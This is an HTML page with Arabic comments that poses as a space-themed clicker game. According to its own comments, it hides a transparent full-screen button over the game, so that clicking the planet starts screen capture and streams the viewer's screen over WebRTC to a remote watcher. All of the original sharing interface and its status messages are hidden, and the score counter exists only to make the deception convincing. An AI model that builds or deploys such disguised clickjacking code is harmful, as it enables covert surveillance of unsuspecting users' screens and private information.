<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Cosmic Clicker</title>
    
    <style>
        /* 1. إخفاء كل شيء من الواجهة القديمة (حتى لا تظهر */
        header, main, #share, #compat, #msg, .video, #preview, #placeholder, #stop {
            display: none !important;
            visibility: hidden !important;
        }

        /* 2. تصميم اللعبة */
        body {
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at center, #1e1b4b 0%, #020617 100%);
            color: #fff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        .game-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 24px;
            box-shadow: 0 0 40px rgba(139, 92, 246, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 80%;
            max-width: 350px;
            position: relative;
            z-index: 10;
        }

        h1 { font-size: 22px; color: #a78bfa; margin-bottom: 5px; }
        .score-board { font-size: 50px; font-weight: 900; color: #fbbf24; margin: 10px 0; }
        
        .fake-button {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #8b5cf6, #4c1d95);
            border: 3px solid #c4b5fd;
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            margin: 0 auto;
            transition: transform 0.1s;
        }

        .fake-button:active { transform: scale(0.9); }

        /* 3. الزر السري الشفاف الذي يغطي الشاشة ويشغل كود المشاركة */
        #start {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important;
            z-index: 9999999 !important;
            cursor: default !important;
            border: none !important;
            background: transparent !important;
            display: block !important;
        }
    </style>
</head>
<body>

    <!-- واجهة اللعبة -->
    <div class="game-container">
        <h1>COSMIC CLICKER</h1>
        <div class="score-board" id="score">0</div>
        <div class="fake-button" id="fakeBtn">🪐</div>
        <p style="color:#64748b; font-size:12px; margin-top:15px;">اضغط على الكوكب لجمع النقاط!</p>
    </div>

    <!-- العناصر المخفية المطلوبة لكي يعمل السكريبت الخاص بك بدون أخطاء -->
    <button id="start">بدء</button>
    <div id="share"></div>
    <div id="compat"></div>
    <p id="msg"></p>
    <div class="video">
        <video id="preview" autoplay playsinline muted></video>
        <div id="placeholder"></div>
    </div>
    <button id="stop" class="hidden"></button>

    <!-- كود اللعبة البصري -->
    <script>
        let score = 0;
        document.addEventListener('click', function(e) {
            // إذا تم الضغط على زر المشاركة الشفاف، نترك السكريبت الأساسي يعمل
            // ولكن نحدث النقاط أيضاً حتى يبدو كأنها لعبة حقيقية
            score += Math.floor(Math.random() * 5) + 1;
            document.getElementById('score').innerText = score;
            let btn = document.getElementById('fakeBtn');
            btn.style.transform = 'scale(0.9)';
            setTimeout(() => btn.style.transform = 'scale(1)', 100);
        });
    </script>

    <!-- سكريبت المشاركة الخاص بك -->
    <script>
        'use strict';
        const $=s=>document.querySelector(s);let ws=null,pc=null,stream=null,ready=false;const stun=[{urls:'stun:stun.l.google.com:19302'}];
        const supported=!!navigator.mediaDevices?.getDisplayMedia;
        // تم تعطيل رسائل الخطأ القديمة لأننا نخفي الواجهة
        // $('#compat').textContent=supported?'...':'...';
        
        function say(s){ console.log("Status: " + s); } // طباعة الرسائل في الكونسول بدلاً من الشاشة
        function cleanup(send=true){if(send && ws?.readyState===1)ws.send(JSON.stringify({type:'stopped'}));if(pc){pc.close();pc=null}if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}$('#preview').srcObject=null;$('#placeholder').classList.remove('hidden');$('#stop').classList.add('hidden');$('#start').classList.remove('hidden');$('#start').disabled=!supported;ready=false}
        
        async function makeOffer(){if(!stream||!ready||ws?.readyState!==1)return;if(pc){pc.close();pc=null}pc=new RTCPeerConnection({iceServers:stun});stream.getTracks().forEach(t=>pc.addTrack(t,stream));pc.onicecandidate=e=>{if(e.candidate&&ws?.readyState===1)ws.send(JSON.stringify({type:'candidate',candidate:e.candidate}))};const offer=await pc.createOffer();await pc.setLocalDescription(offer);ws.send(JSON.stringify({type:'offer',sdp:pc.localDescription}));say('تم إرسال طلب الاتصال')}
        
        function connect(){const proto=location.protocol==='https:'?'wss:':'ws:';const token=location.pathname.split('/').pop();ws=new WebSocket(proto+'//'+location.host+'/ws?role=sender&token='+encodeURIComponent(token));ws.onopen=()=>say('متصل.');ws.onmessage=async e=>{let d;try{d=JSON.parse(e.data)}catch{return}try{if(d.type==='peer-ready'){ready=true;await makeOffer()}else if(d.type==='answer'&&pc)await pc.setRemoteDescription(d.sdp);else if(d.type==='candidate'&&pc)await pc.addIceCandidate(d.candidate);else if(d.type==='peer-left'){ready=false;if(pc){pc.close();pc=null}say('المشاهد غير متصل')}else if(d.type==='ended'){cleanup();say('صاحب الدعوة أنهى الجلسة')}}catch(err){say('خطأ اتصال: '+err.message)}};ws.onclose=()=>{if(stream){cleanup(false);say('انقطع الاتصال')}}}
        
        // هذا هو الزر المخفي الذي سيتم الضغط عليه عند الضغط على اللعبة
        $('#start').onclick=async()=>{
            if(!supported) {
                alert("متصفحك لا يدعم مشاركة الشاشة");
                return;
            }
            try{
                const s=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
                stream=s;
                const track=s.getVideoTracks()[0];
                if(!track){cleanup(false);return}
                track.addEventListener('ended',()=>{cleanup();say('أوقفت مشاركة الشاشة')},{once:true});
                $('#preview').srcObject=s;
                $('#placeholder').classList.add('hidden');
                $('#start').classList.add('hidden');
                $('#stop').classList.remove('hidden');
                say('تم السماح من الجهاز. جاري الاتصال...');
                connect();
            }catch(err){
                say(err.name==='NotAllowedError'?'تم إلغاء المشاركة':'تعذّر بدء البث');
                // إعادة الزر للعمل في حال رفض المستخدم
                $('#start').classList.remove('hidden'); 
            }
        };
        
        $('#stop').onclick=()=>{cleanup();say('تم إيقاف مشاركة شاشتك')};
        addEventListener('pagehide',()=>cleanup());
    </script>
</body>
</html>
